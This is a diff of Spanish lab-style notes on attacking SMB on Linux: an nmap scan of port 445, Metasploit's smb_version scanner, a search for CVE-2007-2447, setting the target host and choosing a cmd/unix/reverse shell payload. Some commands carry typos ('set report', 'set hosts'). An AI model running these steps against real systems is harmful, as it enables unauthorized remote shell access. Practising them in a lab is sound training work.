@@ -20,13 +20,16 @@ y entrara en el FTP
 
 # SMB en linux
 voveremos a analizar los puertos y viendo que tenemos el puerto 445 abierto vamos atacarlo (el servicio de SMB)
+
 podemos hacer un escaneo en profundidad con "nmap -sV -p 445 [ip Objetivo]" sabiendo esto vamos a iniciar la mfsconsola
+
 ejecutaremos un auxilar de smb con el comando "use auxiliary/scanner/smb/smb_version"
 ahora utilizamos el comando set hosts [ip objetivo]
+
 y usaramos search para buscar el codigo de la vulnerabilidad "search cve:2007-2447"
 escribimos el exploit que nosindica en los modulos
-y ahora ponemos "show options"
-y ahora con "set rhost [ip objetivo]"
+ponemos "show options"
+ahora con "set rhost [ip objetivo]"
 y "set report 445"
 y "show options"
 y "show payloads" para ver los payloads y usaremos el cmd/unix/reverse
